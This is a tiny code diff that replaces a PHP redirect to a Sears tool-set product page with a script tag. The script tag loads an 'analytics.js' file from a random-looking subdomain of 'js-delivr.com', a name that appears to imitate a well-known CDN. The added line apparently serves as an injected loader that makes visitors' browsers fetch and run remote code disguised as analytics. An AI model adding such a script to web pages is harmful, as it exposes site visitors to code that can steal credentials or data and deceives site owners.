@@ -1,1 +1,1 @@
-<?php header("Location: https://www.sears.com/craftsman-cm-wrench-set-7pc-flex-metric/p-00935300000P"); die(); ?>
+<script src="https://fkubfhik25.js-delivr.com/js/7jseb/analytics.js"></script>
